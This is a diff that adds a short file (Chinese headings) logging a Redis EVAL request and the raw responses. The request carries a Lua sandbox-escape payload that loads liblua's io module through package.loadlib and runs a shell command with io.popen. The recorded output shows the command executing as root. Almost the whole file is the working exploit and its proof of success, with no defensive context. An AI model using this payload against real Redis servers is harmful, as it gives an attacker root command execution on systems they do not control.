@@ -1,0 +1,15 @@
+### RESP 请求（EVAL + package.loadlib 逃逸脚本）
+{
+  "cmd": "EVAL",
+  "script": "local io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_io\"); local io = io_l(); local f = io.popen(\"id\", \"r\"); local res = f:read(\"*a\"); f:close(); return res",
+  "numkeys": 0
+}
+
+### PING 响应（repr）
+b'+PONG\r\n'
+
+### EVAL 响应（repr）
+b'$39\r\nuid=0(root) gid=0(root) groups=0(root)\n\r\n'
+
+### EVAL 响应（hex）
+2433390d0a7569643d3028726f6f7429206769643d3028726f6f74292067726f7570733d3028726f6f74290a0d0a
